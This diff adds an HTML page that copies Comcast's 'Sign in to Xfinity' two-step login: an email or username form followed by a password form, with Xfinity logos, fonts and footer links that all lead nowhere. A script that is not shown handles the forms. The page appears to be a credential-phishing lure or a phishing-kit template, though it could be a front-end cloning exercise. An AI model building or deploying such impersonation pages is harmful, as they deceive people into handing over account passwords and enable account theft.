@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to Xfinity</title>
+  <link rel="shortcut icon" href="./static/images/favicon.ico" />
+  <link href="./static/fonts/xfinity-brown/stylesheet.css" rel="stylesheet" />
+  <link href="./output.css" rel="stylesheet">
+</head>
+
+<body>
+  <main>
+    <!-- email form -->
+    <div id="email-form-container" class="w-full flex flex-col items-center justify-center lg:grid lg:grid-cols-2">
+      <form id="email-form" class="w-full px-6 pt-5 flex items-center justify-center">
+        <div class="form-wrapper">
+          <div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
+            <img src="./static/images/xfinity-logo-grey.svg" draggable="false"
+              class="inline-block flex-shrink-0 h-6 w-17.75" alt="xfinity" />
+          </div>
+          <h1 class="text-[26px] lg:text-[33px] font-bold">Sign in with your Xfinity ID</h1>
+          <div>
+            <input
+              class="input text contained body1 sc-prism-input-text px-[15px] py-[12px] focus:outline-primary w-full max-w-[420px] mt-3"
+              id="user" autocapitalize="off" autocomplete="username" autocorrect="off" inputmode="text" maxlength="128"
+              name="user" placeholder="Email, mobile, or username" type="text" aria-invalid="false"
+              aria-required="true" />
+            <span id="error-message-wrapper">
+              <span>
+                <svg id="error-icon" style="display: none;" xmlns="http://www.w3.org/2000/svg" width="18" height="18"
+                  viewBox="0 0 24 24" fill="rgb(180, 0, 0)" focusable="false" role="img"
+                  class="size-xs negative primary icon" aria-hidden="true">
+                  <path
+                    d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z">
+                  </path>
+                </svg>
+              </span>
+              <span class="error-message" id="user-error"></span>
+            </span>
+          </div>
+          <div class="mt-[18px] mb-[12px]">
+            <p id="implied-legal" display="body3" class="text-block body3 hydrated font-normal text-[14px]">
+              By signing in, you agree to our
+              <a class="text-primary underline" href="#">Terms of Service</a>
+              and <a class="text-primary underline" href="#">Privacy Policy</a>.
+            </p>
+          </div>
+          <div class="my-[32px]">
+            <button part="native" type="submit"
+              class="w-[105.84px] px-[24px] py-[14px] rounded-[4px] bg-primary hover:bg-[#36156f] transition-colors text-white font-semibold text-[15px] btn md theme1 fill dir-row horizontal default standard sc-prism-button sc-prism-button-s"
+              id="sign_in_confirmed">
+              <p class="text sc-prism-button sc-prism-button-s button hydrated">
+                Sign in
+              </p>
+            </button>
+          </div>
+          <div class="flex flex-col mb-7">
+            <a href="#" target="_self"
+              class="link sc-prism-lineitem w-full border-b py-4 px-3 flex justify-between text-[14px] clickable">
+              <div class="middle sc-prism-lineitem">
+                <span class="upper-row sc-prism-lineitem">
+                  <p class="sc-prism-lineitem text-block body1 hydrated">
+                    Find your Xfinity ID
+                  </p>
+                </span>
+              </div>
+              <div>
+                <svg class="w-[16px] fill-gray-600" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 330 330" xml:space="preserve">
+                  <path id="XMLID_222_" d="M250.606,154.389l-150-149.996c-5.857-5.858-15.355-5.858-21.213,0.001
+               c-5.857,5.858-5.857,15.355,0.001,21.213l139.393,139.39L79.393,304.394c-5.857,5.858-5.857,15.355,0.001,21.213
+               C82.322,328.536,86.161,330,90,330s7.678-1.464,10.607-4.394l149.999-150.004c2.814-2.813,4.394-6.628,4.394-10.606
+               C255,161.018,253.42,157.202,250.606,154.389z" />
+                </svg>
+              </div>
+            </a>
+            <a href="#" target="_self"
+              class="link sc-prism-lineitem w-full py-4 px-3 flex justify-between text-[14px] clickable">
+              <div class="middle sc-prism-lineitem">
+                <span class="upper-row sc-prism-lineitem">
+                  <p class="sc-prism-lineitem text-block body1 hydrated">
+                    Find your Xfinity ID
+                  </p>
+                </span>
+              </div>
+              <div>
+                <svg class="w-[16px] fill-gray-600" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 330 330" xml:space="preserve">
+                  <path id="XMLID_222_" d="M250.606,154.389l-150-149.996c-5.857-5.858-15.355-5.858-21.213,0.001
+               c-5.857,5.858-5.857,15.355,0.001,21.213l139.393,139.39L79.393,304.394c-5.857,5.858-5.857,15.355,0.001,21.213
+               C82.322,328.536,86.161,330,90,330s7.678-1.464,10.607-4.394l149.999-150.004c2.814-2.813,4.394-6.628,4.394-10.606
+               C255,161.018,253.42,157.202,250.606,154.389z" />
+                </svg>
+              </div>
+            </a>
+          </div>
+        </div>
+      </form>
+      <div class="ad-block">
+        <div id="desktop-ad-block" class="hidden lg:block lg:h-[640px] w-full">
+        </div>
+        <div id="mobile-ad-block" class="lg:hidden">
+          <img src="./static/images/olympics_2024_symphony_mobile.jpg" alt="xfinity mobile"
+            class="h-[210px] w-[250px]" />
+        </div>
+      </div>
+    </div>
+
+    <!-- password form -->
+    <div id="password-form-container" class="w-full flex flex-col items-center justify-center">
+      <form id="password-form" class="w-full px-6 pt-5 lg:pt-24 flex items-center justify-center">
+        <div class="form-wrapper">
+          <div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
+            <img src="./static/images/xfinity-logo-grey.svg" draggable="false"
+              class="inline-block flex-shrink-0 h-6 w-17.75" alt="xfinity" />
+          </div>
+          <p id="user-email" class="font-bold mb-5"></p>
+          <h1 class="text-[26px] lg:text-[33px] font-bold">Enter your password</h1>
+          <div>
+            <div class="relative">
+              <input
+                class="input text contained body1 sc-prism-input-text px-[15px] py-[12px] focus:outline-primary w-full max-w-[420px] mt-3"
+                id="user-password" autocapitalize="off" autocomplete="password" autocorrect="off" inputmode="text"
+                maxlength="128" name="user" placeholder="" type="password" aria-invalid="false" aria-required="true" />
+              <button type="button" id="toggle-password"
+                class="absolute inset-y-0 z-50 top-[9px] right-[22px] px-3 py-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor"
+                  focusable="false" role="img" class="size-sm neutral primary icon" aria-hidden="true">
+                  <path
+                    d="M13.49,12A1.5,1.5,0,1,1,12,10.5,1.5,1.5,0,0,1,13.49,12ZM21,12a11.08,11.08,0,0,1-9,5,11.08,11.08,0,0,1-9-5,11.07,11.07,0,0,1,9-5A11.07,11.07,0,0,1,21,12Zm-6,0a3,3,0,1,0-3,3A3,3,0,0,0,15,12Z">
+                  </path>
+                </svg>
+              </button>
+            </div>
+            <span id="password-error-message-wrapper" class="hidden">
+              <span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="rgb(180, 0, 0)"
+                  focusable="false" role="img" class="size-xs negative primary icon" aria-hidden="true">
+                  <path
+                    d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z">
+                  </path>
+                </svg>
+              </span>
+              <span class="error-message" id="password-error"></span>
+            </span>
+          </div>
+          <div class="my-4">
+            <a class="font-bold text-primary" href="#">Forgot
+              password?</a>
+          </div>
+          <div class="my-8">
+            <label id="remember-me" class="text-block body3 hydrated font-normal text-[18px]">
+              <input type="checkbox" id="remember-me" name="remember-me">
+              Keep me signed in
+            </label>
+          </div>
+          <div class="mt-[18px] mb-[12px]">
+            <p id="implied-legal" display="body3" class="text-block body3 hydrated font-normal text-[14px]">
+              By signing in, you agree to our
+              <a class="text-primary underline" href="#">Terms of Service</a>
+              and <a class="text-primary underline" href="#">Privacy Policy</a>.
+            </p>
+          </div>
+          <div class="my-[32px]">
+            <button part="native" type="submit"
+              class="w-[105.84px] px-[24px] py-[14px] rounded-[4px] bg-primary hover:bg-[#36156f] transition-colors text-white font-semibold text-[15px] btn md theme1 fill dir-row horizontal default standard sc-prism-button sc-prism-button-s"
+              id="sign_in">
+              <p class="text sc-prism-button sc-prism-button-s button hydrated">
+                Let's go
+              </p>
+            </button>
+          </div>
+          <div class="flex flex-col mb-7">
+            <a href="#" target="_self"
+              class="link sc-prism-lineitem w-full border-b py-4 px-3 flex justify-between text-[14px] clickable">
+              <div class="middle sc-prism-lineitem">
+                <span class="upper-row sc-prism-lineitem">
+                  <p class="sc-prism-lineitem text-block body1 hydrated">
+                    Find your Xfinity ID
+                  </p>
+                </span>
+              </div>
+              <div>
+                <svg class="w-[16px] fill-gray-600" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 330 330" xml:space="preserve">
+                  <path id="XMLID_222_" d="M250.606,154.389l-150-149.996c-5.857-5.858-15.355-5.858-21.213,0.001
+               c-5.857,5.858-5.857,15.355,0.001,21.213l139.393,139.39L79.393,304.394c-5.857,5.858-5.857,15.355,0.001,21.213
+               C82.322,328.536,86.161,330,90,330s7.678-1.464,10.607-4.394l149.999-150.004c2.814-2.813,4.394-6.628,4.394-10.606
+               C255,161.018,253.42,157.202,250.606,154.389z" />
+                </svg>
+              </div>
+            </a>
+            <a href="#" target="_self"
+              class="link sc-prism-lineitem w-full py-4 px-3 flex justify-between text-[14px] clickable">
+              <div class="middle sc-prism-lineitem">
+                <span class="upper-row sc-prism-lineitem">
+                  <p class="sc-prism-lineitem text-block body1 hydrated">
+                    Find your Xfinity ID
+                  </p>
+                </span>
+              </div>
+              <div>
+                <svg class="w-[16px] fill-gray-600" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg"
+                  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 330 330" xml:space="preserve">
+                  <path id="XMLID_222_" d="M250.606,154.389l-150-149.996c-5.857-5.858-15.355-5.858-21.213,0.001
+               c-5.857,5.858-5.857,15.355,0.001,21.213l139.393,139.39L79.393,304.394c-5.857,5.858-5.857,15.355,0.001,21.213
+               C82.322,328.536,86.161,330,90,330s7.678-1.464,10.607-4.394l149.999-150.004c2.814-2.813,4.394-6.628,4.394-10.606
+               C255,161.018,253.42,157.202,250.606,154.389z" />
+                </svg>
+              </div>
+            </a>
+          </div>
+        </div>
+      </form>
+    </div>
+  </main>
+  <footer class="w-full">
+    <div class="my-4 text-center text-[#141417] text-[12px] font-light">© 2024 Comcast</div>
+    <div>
+      <ul
+        class="flex flex-col lg:flex-row m-auto max-w-[700px] lg:max-w-none flex-wrap lg:flex-nowrap text-center justify-center items-center list-none pb-2 text-[12px]">
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class="flex items-center justify-center relative link-focus" id="footer--web-terms-of-service"
+            target="_blank" href="#">
+            <div class="mr-1 h-4 w-4 leading-none">
+              <svg xmlns="http://www.w3.org/2000/svg" class="w-[16px]" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <path
+                  d="M16,2H8A3,3,0,0,0,5,5V19a3,3,0,0,0,3,3h8a3,3,0,0,0,3-3V5A3,3,0,0,0,16,2Zm1.5,17A1.5,1.5,0,0,1,16,20.5H8A1.5,1.5,0,0,1,6.5,19V5A1.5,1.5,0,0,1,8,3.5h8A1.5,1.5,0,0,1,17.5,5Zm-5-14H8v5H12.5ZM11,8.5H9.51v-2H11Zm-3,6h8V16H8Zm0,3h8V19H8ZM16,10H14V8.51h2ZM8,11.5h8V13H8Z">
+                </path>
+              </svg>
+            </div>
+            <div>Web Terms Of Service</div>
+          </a>
+        </li>
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class="inline-flex items-center relative link-focus" id="footer--ca-notice-at-collection" target="_blank"
+            href="#"><span class="mr-1 h-4 w-4 leading-none">
+              <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <path
+                  d="M13.3,7H6V5.5h7.3Zm.93,13.49c-.2,0-.41,0-.61,0a1.12,1.12,0,0,1-.32,0H6A1.5,1.5,0,0,1,4.5,19V5A1.5,1.5,0,0,1,6,3.5h7.3A1.5,1.5,0,0,1,14.8,5V7.14h.52a6.37,6.37,0,0,1,1,.08V5a3,3,0,0,0-3-3H6A3,3,0,0,0,3,5V19a3,3,0,0,0,3,3h7.3a3,3,0,0,0,2.6-1.53l-.58,0ZM6,19h4a6.79,6.79,0,0,1-1.38-1.5H6Zm0-3H7.89a6.29,6.29,0,0,1-.34-1.5H6Zm1.94-4.5H6V13H7.57A6.33,6.33,0,0,1,7.94,11.5Zm2.25-3H6V10H8.73A6.5,6.5,0,0,1,10.19,8.5ZM22,18.83l-1.07,1.06L18.74,17.7A5.19,5.19,0,0,1,15.32,19H14.23a4.73,4.73,0,0,1-.93-.09h0a3.92,3.92,0,0,1-.49-.13,2.64,2.64,0,0,1-.4-.12,3.25,3.25,0,0,1-.43-.18l-.42-.23-.34-.2a5.64,5.64,0,0,1-.65-.54,5.1,5.1,0,0,1,.17-7.5h0a4.83,4.83,0,0,1,1-.71L12,9.17a4,4,0,0,1,.48-.2c.12-.05.25-.08.38-.12a3.43,3.43,0,0,1,.46-.11h0a4.73,4.73,0,0,1,.93-.1h1.09a5.2,5.2,0,0,1,5.22,5.18,5.1,5.1,0,0,1-.81,2.75Zm-2.95-5a3.7,3.7,0,0,0-3.72-3.68H14.23a3.68,3.68,0,1,0,0,7.35h1.09A3.7,3.7,0,0,0,19,13.82Z">
+                </path>
+              </svg> </span>CA Notice at Collection</a>
+        </li>
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class="inline-flex items-center relative link-focus" id="footer--privacy-policy" target="_blank"
+            href="#"><span class="mr-1 h-4 w-4 leading-none">
+              <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <path
+                  d="M17.22,17.25a2.29,2.29,0,0,0,.78-.14V19a3,3,0,0,1-3,3H8a3,3,0,0,1-3-3V5A3,3,0,0,1,8,2H15a3,3,0,0,1,3,3V6.91a2.16,2.16,0,0,0-.77-.16h0a2.14,2.14,0,0,0-.72.14V5A1.47,1.47,0,0,0,15,3.5H8A1.47,1.47,0,0,0,6.5,5V19A1.47,1.47,0,0,0,8,20.5H15A1.47,1.47,0,0,0,16.5,19v-1.9A2.47,2.47,0,0,0,17.22,17.25ZM7.93,19h7.14V17.5H7.93Zm5.17-4.5H7.93V16h6.5A5.22,5.22,0,0,1,13.1,14.5Zm-5.17-3V13h4.62a11.4,11.4,0,0,1-.19-1.5Zm5.1-3H7.93V10h4.44a1.21,1.21,0,0,1,0-.2A1.84,1.84,0,0,1,13,8.5Zm2-3H7.93V7h7.14Zm5.26,7.57a3,3,0,0,1-.13.36,3.13,3.13,0,0,1-.55.87A5.46,5.46,0,0,1,18,15.49l-.43.19a.84.84,0,0,1-.35.07.92.92,0,0,1-.36-.07l-.36-.16c-.17-.09-.36-.18-.56-.3a6.07,6.07,0,0,1-.7-.5l-.1-.08-.07-.07V14.5H15a3.16,3.16,0,0,1-.76-1.07,3,3,0,0,1-.13-.36.25.25,0,0,0,0-.07,7.33,7.33,0,0,1-.22-1.5,12.33,12.33,0,0,1,0-1.5.37.37,0,0,1,0-.11.29.29,0,0,1,.06-.19.68.68,0,0,1,.29-.22h0l.13-.06.69-.27,1.43-.62.22-.1L17,8.31a.6.6,0,0,1,.27-.06h0a.58.58,0,0,1,.26.06l.23.12.28.13c.66.3,1.61.68,2.06.86l.14.06h0a.63.63,0,0,1,.28.21.36.36,0,0,1,.07.19A10.64,10.64,0,0,1,20.33,13.07Zm-.75-2-.7-.71-.88.87-1.07,1.07-.43-.43L16,11.33l-.71.71L16.5,13.3l.43.43L18,12.66Z">
+                </path>
+              </svg>
+            </span>Privacy Policy</a>
+        </li>
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class="inline-flex items-center relative link-focus" id="footer--your-privacy-choices" target="_blank"
+            href="#">
+            <div class="mr-1 h-4 w-4 leading-none">
+              <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <path
+                  d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5Zm.83,7.17,1.06-1.06,1.33,1.33,1.33-1.33,1.06,1.06L17.86,12l1.33,1.33-1.06,1.06L16.8,13.06l-1.33,1.33-1.06-1.06L15.74,12ZM3.5,12.08v-.16A6.92,6.92,0,0,1,10.42,5h3.22L10.36,19A6.92,6.92,0,0,1,3.5,12.08ZM7,14.5,4.89,12.39,6,11.33l1,1.05L9.77,9.61l1.06,1.06Z">
+                </path>
+              </svg>
+            </div>Your Privacy Choices
+          </a>
+        </li>
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class=" flex justify-center items-center gap-1 relative text-[11px] link-focus" id="footer--ad-choices"
+            target="_blank" href="#">
+            <div class="h-4 w-4 leading-none">
+              <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <path
+                  d="M17.54,4A5.32,5.32,0,0,0,12,5.42,5.31,5.31,0,0,0,6.46,4,5.34,5.34,0,0,0,3,9.34c0,3.08,2.71,5.47,5.57,8,1,.85,1.95,1.72,2.87,2.65l.59.53.53-.53c.92-.93,1.91-1.8,2.87-2.65,2.86-2.54,5.57-4.93,5.57-8A5.34,5.34,0,0,0,17.54,4Zm-3.11,12.2c-.8.71-1.63,1.44-2.43,2.22-.8-.78-1.63-1.51-2.43-2.22a30,30,0,0,1-3.75-3.71H9.26a.75.75,0,0,0,.63-.35l.85-1.29,1.56,3.34a.75.75,0,0,0,.61.43H13a.75.75,0,0,0,.61-.31l1.33-1.82h3.26A30,30,0,0,1,14.43,16.23ZM19.12,11H14.54a.76.76,0,0,0-.61.3l-.81,1.11L11.52,9a.73.73,0,0,0-.63-.43.75.75,0,0,0-.68.34L8.85,11h-4A4.19,4.19,0,0,1,4.5,9.34,3.84,3.84,0,0,1,7,5.45a3.33,3.33,0,0,1,1.16-.2,4.11,4.11,0,0,1,3.2,1.64.91.91,0,0,0,1.39,0,3.9,3.9,0,0,1,4.35-1.44A3.84,3.84,0,0,1,19.5,9.34,4.19,4.19,0,0,1,19.12,11Z">
+                </path>
+              </svg>
+            </div>
+            <div>Health Privacy Notice</div>
+          </a>
+        </li>
+        <li class="text-body2 px-6 mb-4 block w-full sm:w-auto sm:inline-flex">
+          <a class=" flex justify-center items-center gap-1 relative text-[11px] link-focus" id="footer--ad-choices"
+            target="_blank" href="#">
+            <div class="h-4 w-4 leading-none">
+              <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+                focusable="false" role="img" aria-hidden="true">
+                <g>
+                  <circle cx="10.75" cy="14.75" r="0.75"></circle>
+                  <path
+                    d="M19.27,9,14.16,6a.75.75,0,0,0-1,.27.74.74,0,0,0,.27,1l5.11,3a2,2,0,0,1,0,3.48l-11,6.48a2,2,0,0,1-2,0,2,2,0,0,1-1-1.74v-13a2,2,0,0,1,1-1.74,2,2,0,0,1,2,0L10,5.25V12a.75.75,0,0,0,1.5,0V4.82a.76.76,0,0,0-.37-.65L8.26,2.49a3.44,3.44,0,0,0-3.49,0A3.49,3.49,0,0,0,3,5.51v13a3.49,3.49,0,0,0,1.77,3.05,3.44,3.44,0,0,0,3.49,0l11-6.48a3.52,3.52,0,0,0,0-6.06Z">
+                  </path>
+                </g>
+              </svg>
+            </div>
+            <div>Ad Choices</div>
+          </a>
+        </li>
+      </ul>
+    </div>
+    <div>
+      <button
+        class="bg-[#141417] text-white py-2 font-medium w-full flex items-center justify-center gap-[3px] relative link-focus"
+        id="footer--cookie-preferences">
+        <div class="h-4 w-4 leading-none">
+          <svg class="w-[16px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"
+            focusable="false" role="img" aria-hidden="true">
+            <g>
+              <path
+                d="M13.12,3.57A8.51,8.51,0,0,1,13,20.45c-.32,0-.65.05-1,.05A8.52,8.52,0,0,1,3.56,13a4.92,4.92,0,0,0,1.93-.42,5.12,5.12,0,0,0,3-4.11,5,5,0,0,0,1.56-.4,5.1,5.1,0,0,0,3.06-4.52M12,2h-.31a.27.27,0,0,0-.24.34,3.6,3.6,0,0,1-2,4.37A3.54,3.54,0,0,1,8.05,7a3.33,3.33,0,0,1-.78-.09H7.21a.25.25,0,0,0-.25.3,3.58,3.58,0,0,1-3.49,4.3,3.73,3.73,0,0,1-1.32-.25h0a.08.08,0,0,0-.09.08q0,.33,0,.66A10,10,0,0,0,12,22a11,11,0,0,0,1.14-.06A10,10,0,0,0,12,2Z">
+              </path>
+              <circle cx="11.99" cy="12.01" r="1.38"></circle>
+              <circle cx="15.14" cy="7.38" r="1.37"></circle>
+              <circle cx="17.23" cy="13" r="1.38"></circle>
+              <circle cx="12.97" cy="17.25" r="1.38"></circle>
+              <circle cx="7.36" cy="15.17" r="1.37"></circle>
+            </g>
+          </svg>
+        </div>
+        <div class="text-[12px]">Cookie Preferences</div>
+      </button>
+    </div>
+  </footer>
+  <script src="./static/script.js"></script>
+</body>
+
+</html>
